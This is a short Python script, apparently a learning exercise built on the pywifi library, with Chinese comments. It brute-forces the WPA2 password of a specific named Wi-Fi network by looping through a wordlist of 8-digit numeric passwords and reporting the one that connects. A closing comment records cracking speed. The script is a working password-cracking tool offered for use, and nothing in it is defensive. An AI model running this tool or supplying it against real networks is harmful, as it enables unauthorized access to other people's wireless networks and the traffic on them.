# _*_coding :utf-8 _*_
# @Time :2022/7/20 2:12
# @File : Python第三方库_pywifi
# @Project : python_NCRE
import os

import pywifi
from pywifi import const  #引用一些定义
import time
import json


def testwifi(password):

    wifi=pywifi.PyWiFi()   #抓取WiFi接口
    ifaces=wifi.interfaces()[0]  #一般来说，平台上只有一个Wi-Fi接口。因此，使用索引0来获得Wi-Fi接口
    #print(ifaces.name())  #我们可以试试输出网卡名称
    ifaces.disconnect()  #断开网卡连接

    profile=pywifi.Profile()   #定义配置文件对象
    profile.ssid='Tenda_B6E5F0'   #wifi名称，貌似不能用中文？
    profile.auth=const.AUTH_ALG_OPEN   #auth - AP的认证算法
    profile.akm.append(const.AKM_TYPE_WPA2PSK) #选择wifi加密方式  akm - AP的密钥管理类型
    profile.cipher=const.CIPHER_TYPE_CCMP  #cipher - AP的密码类型
    profile.key=password   #wifi密钥 如果无密码，则应该设置此项CIPHER_TYPE_NONE

    ifaces.remove_all_network_profiles()  #删除其他配置文件
    tmp_profile=ifaces.add_network_profile(profile)   #加载配置文件

    ifaces.connect(tmp_profile)   #按配置文件进行连接
    time.sleep(0.3)  #尝试几秒能否成功连接

    if ifaces.status() == const.IFACE_CONNECTED:   #判断连接状态
        return True
    else:
        return False


def main():
    print("start ...")
    path=r".\WiFi密码类型\纯数字(8).txt"
    if not os.path.exists(path):
        open(path,'x')
    files = open(path,'r')
    f = json.loads(files.read())
    # print(f)
    print('正在暴力破解中')
    for i in f:
        # f = f[0:-1]   #去除了这行文本的最后一个字符（换行符）后剩下的部分
        # print('[-]正在尝试:', f)
        # print(i)
        bool=testwifi(i)
        if bool:
            print('[+]wifi连接成功!')
            print("密码为：",i)
            break

    files.close()


if __name__=="__main__":
    main()

'''
将 一个g 的txt 密码本 加载到 内存中 耗时 10秒左右
暴力 破解 100次  耗时 3分钟

'''


























